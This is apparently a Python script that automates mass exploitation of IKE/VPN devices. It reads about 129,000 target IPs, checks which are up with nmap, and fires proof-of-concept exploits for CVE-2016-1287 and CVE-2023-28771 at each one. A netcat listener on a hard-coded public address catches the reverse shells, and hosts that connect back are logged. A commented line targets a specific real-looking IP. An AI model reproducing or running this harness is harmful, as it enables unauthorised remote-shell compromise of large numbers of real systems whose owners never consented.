import os
from func_timeout import func_set_timeout
import func_timeout
import json
import subprocess
from __logs.__log import log_init, log_init_reverse_shell
from __utils.__command_util import nmap_command, common_command, nc_command
from multiprocessing import Process


logger_path = "./logging_poc_verify.log"
ike_ip_path = "./ike_ip_list.txt"
poc_verify_result_path = "./poc_verify_result_v1.txt"
listen_time, listen_port = 2, "20023"
poc_time = 2


def use_cve_2016_1287(dst_ip, loc_ip, loc_port):

    listen_filename = f"./reverse_shell_log/{dst_ip}_cve-2016-1287.txt"
    p1 = Process(target=nc_command, args=(listen_port, listen_filename, listen_time))
    p1.start()
    
    poc_cmd = f"timeout {listen_time} python ../zgc-pocs/ike/CVE-2016-1287.py {dst_ip} {loc_ip} {loc_port}"
    p2 = Process(target=common_command, args=(poc_cmd,))
    p2.start()
    
    p1.join()
    with open(listen_filename, 'r', encoding="utf-8") as file:
        count = file.read().count('\n')
    if count >= 1:
        return True
    else:
        return False
     

def use_cve_2023_28771(dst_ip, loc_ip, loc_port):
    
    listen_filename = f"./reverse_shell_log/{dst_ip}_cve-2023-28771.txt"
    p1 = Process(target=nc_command, args=(listen_port, listen_filename, listen_time))
    p1.start()
    
    poc_cmd = f"timeout {listen_time} python3 ../zgc-pocs/ike/CVE-2023-28771.py {dst_ip} --lhost {loc_ip} --lport {loc_port}"
    p2 = Process(target=common_command, args=(poc_cmd,))
    p2.start()
    
    p1.join()
    with open(listen_filename, 'r', encoding="utf-8") as file:
        count = file.read().count('\n')
    if count >= 1:
        return True
    else:
        return False


def read_ike_ip_json(poc_logger):
    ip_list = []
    port_dict = {}
    json_path = "../ike.json"
    json_lines = open(json_path, "r", encoding="utf-8").readlines()
    
    for line in json_lines:
        json_tmp = json.loads(line)
        ip_list.append(json_tmp['ip'])
        
        port_dict[json_tmp['port']] = True

    with open(ike_ip_path, "w", encoding="utf-8") as f:
        f.write("\n".join(ip_list))
        
    poc_logger.info("[+] Read IKE IP JSON successfully!")
    return ip_list


def detect_up(host_list, poc_logger, start, end):
    up_ip_list = []
    cmd = "nmap -sP "
    
    id_cnt = 0
    for ip in host_list:
        id_cnt += 1
        nmap_cmd = cmd + ip 
        cmd_result  = nmap_command(nmap_cmd)
        if "Host is up" in cmd_result:
            up_ip_list.append(ip)
            poc_logger.info(str(id_cnt) + f" {ip} UP")
        else:
            # print(ip, cmd_result)
            poc_logger.info(str(id_cnt) + f" {ip} DOWN")
        

    up_ip_path = f"./up_ip_list_{start}_{end}.txt"
    with open(up_ip_path, "w", encoding="utf-8") as f:
        f.write("\n".join(up_ip_list))
        
    poc_logger.info(f"[+] {start} to {end} detect ip UP or DOWN successfully!")
    

def detect_cve(host_ip, lhost, lport, poc_logger_reverse, id_cnt):
    
    if use_cve_2023_28771(host_ip, lhost, lport):
        poc_logger_reverse.info(f"[+]{id_cnt} {host_ip}: Server-{lhost} listening port-{lport} heared from {host_ip}")
        return "cve-2023-28771", True
    if use_cve_2016_1287(host_ip, lhost, lport):
        poc_logger_reverse.info(f"[+]{id_cnt} {host_ip}: Server-{lhost} listening port-{lport} heared from {host_ip}")
        return "cve-2016-1287", True
    
    poc_logger_reverse.info(f"[-]{id_cnt} {host_ip}: Server-{lhost} listening port-{lport} had no response ")
    return None, False
    
    
def poc(start:int, end:int):
    
    lhost, lport = "202.112.51.218", "20023"
    up_ip_path = f"./up_ip_list_{start}_{end}.txt"  
    
    # # before: setup_clear the log and open the listen_port of server
    # # logger_path = f"./logging_poc_verify_{start}_{end}.log"
    # logger_path = f"./logging_poc_verify_cve_{start}_{end}.log"
    # poc_logger = log_init(start, end)
    # with open(logger_path, "w", encoding="utf-8") as fclean:
    #     pass

    
    # # step1 : read ip list
    # if not os.path.exists(ike_ip_path):
    #     ip_list = read_ike_ip_json(poc_logger)[start:end+1]
    # else:
    #     ip_list = open(ike_ip_path, "r", encoding="utf-8").read().split("\n")[start:end+1]
    #     poc_logger.info(f"[+] Read IKE IP({start} to {end}) JSON successfully!")
          
    # # step2 : detect the hosts UP or DOWN
    # if not os.path.exists(up_ip_path):
    #     detect_up(ip_list, poc_logger, start, end)
    
    
    # step3 : cve_poc_verify

    up_ip_list = open(up_ip_path, "r", encoding="utf-8").read().split("\n")
   
    poc_logger_reverse = log_init_reverse_shell(start, end)
    id_cnt = 0
    for rhost in up_ip_list:
        id_cnt += 1
        cve_id, result = detect_cve(rhost, lhost, lport, poc_logger_reverse, id_cnt)
        if result:
            with open(poc_verify_result_path, "a", encoding="utf-8") as ff:
                ff.write(f"{cve_id}: {rhost}")
            

if __name__ == "__main__":
    
    # use_cve_2016_1287("213.254.63.34", "202.112.51.218", "111")
    
    
    # process_number: 10 个进程来跑
    total_number = 129215
    process_number = 10
    delta = int(total_number / process_number)
    for i in range(process_number):
        start, end = i*delta, (i+1)*delta - 1  
        if end >= total_number:
            end = total_number - 1
            
        p = Process(target=poc, args=(start, end))
        p.start()